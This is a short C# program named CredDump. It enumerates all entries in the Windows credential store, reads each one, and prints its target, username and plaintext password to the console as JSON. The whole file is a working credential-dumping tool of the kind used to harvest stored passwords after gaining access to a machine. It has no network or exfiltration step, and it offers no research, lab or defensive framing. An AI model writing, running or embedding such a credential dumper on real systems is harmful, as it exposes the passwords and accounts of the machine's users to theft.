

namespace CredDump
{
    using System;
    using System.IO;
    using System.Runtime.Serialization.Json;
    using System.Text;
    using Kraken.Security.Credentials;

    [Serializable]
    struct PwdData
    {
        public String Target;
        public String UserName;
        public String Password;
    }

    class Program
    {

        static DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(PwdData));

        static String ConvertToString(PwdData data)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                serializer.WriteObject(ms, data);
                return Encoding.Default.GetString(ms.ToArray());
            }

        }

        static void Main(string[] args)
        {
            
            CredUtils.Credential[] creds;
            CredUtils.CredEnum("*", out creds);
            foreach(var cred in creds)
            {
                CredUtils.Credential c;
                int rv = CredUtils.CredRead(cred.TargetName, cred.Type, out c);
                
                if (rv == 0)
                {
                    var target = c.TargetName.Split('=')[1];
                    var pwd = new PwdData();
                    pwd.Target = target;
                    pwd.UserName = c.UserName;
                    pwd.Password = c.CredentialBlob;
                                        
                    Console.WriteLine(ConvertToString(pwd));
                }

                //CredentialManagement.Credential c = new CredentialManagement.Credential();
                //c.Target = cred.TargetName.Split('=')[1];
                //if (c.Load())
                //{
                //    
                //}

            }

        }

    }
}
